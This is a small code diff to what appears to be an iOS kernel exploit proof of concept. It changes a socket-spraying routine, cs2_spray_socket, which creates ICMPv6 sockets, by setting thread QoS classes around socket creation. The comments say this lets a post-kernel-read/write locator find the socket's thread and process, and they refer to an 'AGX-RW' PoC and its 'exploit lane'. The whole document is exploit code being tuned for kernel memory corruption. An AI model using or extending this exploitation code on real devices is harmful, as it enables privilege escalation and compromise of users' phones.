@@ -4,6 +4,7 @@
 #include <netinet/icmp6.h>
 #include <netinet/in.h>
 #include <pthread.h>
+#include <pthread/qos.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
@@ -47,7 +48,12 @@ void cs2_sockets_leak_forever(void) {
 
 uint64_t cs2_spray_socket(void) {
     // create socket icmpv6
+    /* Mark this socket's so_background_thread as the current thread so the
+       post-KRW socket→thread→proc locator works (AGX-RW-iOS-PoC 22G100).
+       Harmless if it fails; the exploit lane is unchanged. */
+    pthread_set_qos_class_self_np(QOS_CLASS_BACKGROUND, 0);
     int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
     if (fd < 0) {
         LOG_ERR("socket create failed");
         return UINT64_MAX;
